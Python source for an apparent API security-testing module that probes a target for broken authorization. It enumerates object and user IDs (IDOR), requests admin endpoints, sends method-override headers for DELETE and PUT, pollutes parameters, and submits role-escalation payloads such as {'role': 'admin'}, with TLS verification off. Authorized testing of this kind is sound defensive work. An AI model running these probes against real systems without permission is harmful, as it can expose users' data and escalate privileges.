"""
Authorization Attacks Module (BOLA/BFLA/IDOR)
- Insecure Direct Object Reference (IDOR)
- Horizontal privilege escalation
- Vertical privilege escalation
- Object level authorization bypass
"""

import requests
from typing import Dict, Any, List
import logging

logger = logging.getLogger(__name__)

class AuthorizationAttackAnalyzer:
    """Analyze authorization and access control vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        
    def test_idor(self, endpoint_template: str, param_name: str = 'id') -> Dict[str, Any]:
        """Test Insecure Direct Object Reference (IDOR)"""
        logger.info(f"[*] Testing IDOR on {endpoint_template}...")
        
        vulnerabilities = []
        
        # Test sequential IDs
        for test_id in range(1, 20):
            try:
                url = endpoint_template.replace('{id}', str(test_id))
                resp = requests.get(
                    f"{self.base_url}{url}",
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] Accessed ID {test_id}: {resp.status_code}")
                    vulnerabilities.append({
                        'id': test_id,
                        'accessible': True,
                        'response_size': len(resp.text)
                    })
            except Exception as e:
                pass
        
        return {
            'vulnerable': len(vulnerabilities) > 0,
            'accessible_objects': vulnerabilities,
            'technique': 'Sequential IDOR'
        }
    
    def test_horizontal_escalation(self, user_endpoints: List[str]) -> Dict[str, Any]:
        """Test horizontal privilege escalation (access other user's data)"""
        logger.info("[*] Testing horizontal privilege escalation...")
        
        results = {}
        user_ids = ['1', '2', '3', 'admin', 'test', 'user']
        
        for endpoint in user_endpoints:
            accessible_users = []
            
            for user_id in user_ids:
                try:
                    url = endpoint.replace('{user_id}', user_id)
                    resp = requests.get(
                        f"{self.base_url}{url}",
                        headers=self.headers,
                        timeout=5,
                        verify=False
                    )
                    
                    if resp.status_code == 200:
                        accessible_users.append(user_id)
                        logger.info(f"[+] Horizontal escalation: Accessed user {user_id}")
                except:
                    pass
            
            results[endpoint] = {
                'vulnerable': len(accessible_users) > 0,
                'accessible_users': accessible_users
            }
        
        return results
    
    def test_vertical_escalation(self, admin_endpoints: List[str]) -> Dict[str, Any]:
        """Test vertical privilege escalation (access admin functions)"""
        logger.info("[*] Testing vertical privilege escalation...")
        
        accessible_admin_endpoints = []
        
        for endpoint in admin_endpoints:
            try:
                resp = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200:
                    accessible_admin_endpoints.append({
                        'endpoint': endpoint,
                        'status': resp.status_code
                    })
                    logger.info(f"[+] Vertical escalation: Accessed admin endpoint {endpoint}")
            except:
                pass
        
        return {
            'vulnerable': len(accessible_admin_endpoints) > 0,
            'accessible_endpoints': accessible_admin_endpoints
        }
    
    def test_method_override(self, endpoint: str) -> Dict[str, Any]:
        """Test HTTP method override for authorization bypass"""
        logger.info(f"[*] Testing HTTP method override on {endpoint}...")
        
        url = f"{self.base_url}{endpoint}"
        results = {}
        
        # Test X-HTTP-Method-Override header
        methods = ['DELETE', 'PUT', 'PATCH']
        
        for method in methods:
            try:
                headers = self.headers.copy()
                headers['X-HTTP-Method-Override'] = method
                
                resp = requests.get(url, headers=headers, timeout=5, verify=False)
                if resp.status_code != 405:
                    results[method] = {
                        'bypassed': True,
                        'status': resp.status_code
                    }
                    logger.info(f"[+] Method override successful: {method}")
            except:
                pass
        
        return results
    
    def test_parameter_pollution(self, endpoint: str, param: str) -> Dict[str, Any]:
        """Test parameter pollution for authorization bypass"""
        logger.info(f"[*] Testing parameter pollution on {endpoint}...")
        
        url = f"{self.base_url}{endpoint}"
        
        # Duplicate parameter with different values
        params = {
            param: 'user1',
            f"{param}_": 'admin'
        }
        
        try:
            resp = requests.get(url, params=params, headers=self.headers, timeout=5, verify=False)
            if resp.status_code == 200:
                logger.info(f"[+] Parameter pollution successful")
                return {
                    'vulnerable': True,
                    'technique': 'Parameter Pollution',
                    'response': resp.text[:200]
                }
        except Exception as e:
            logger.error(f"[-] Parameter pollution test failed: {e}")
        
        return {'vulnerable': False}
    
    def test_role_manipulation(self, endpoint: str) -> Dict[str, Any]:
        """Test role/permission manipulation in requests"""
        logger.info(f"[*] Testing role manipulation on {endpoint}...")
        
        payloads = [
            {'role': 'admin'},
            {'isAdmin': True},
            {'permissions': ['admin', 'delete']},
            {'privilege_level': '9999'}
        ]
        
        for payload in payloads:
            try:
                resp = requests.put(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code in [200, 201]:
                    logger.info(f"[+] Role manipulation accepted: {payload}")
                    return {
                        'vulnerable': True,
                        'payload': payload,
                        'response': resp.text[:200]
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def analyze(self) -> Dict[str, Any]:
        """Run full authorization analysis"""
        logger.info("[*] Starting authorization attack analysis...")
        
        results = {
            'idor_tests': self.test_idor('/api/users/{id}'),
            'horizontal_escalation': self.test_horizontal_escalation([
                '/api/profile/{user_id}',
                '/api/users/{user_id}/settings'
            ]),
            'vertical_escalation': self.test_vertical_escalation([
                '/api/admin/users',
                '/api/admin/settings',
                '/api/admin/reports'
            ]),
            'method_override': self.test_method_override('/api/delete/resource'),
            'parameter_pollution': self.test_parameter_pollution('/api/search', 'user'),
            'role_manipulation': self.test_role_manipulation('/api/profile/update')
        }
        
        return results
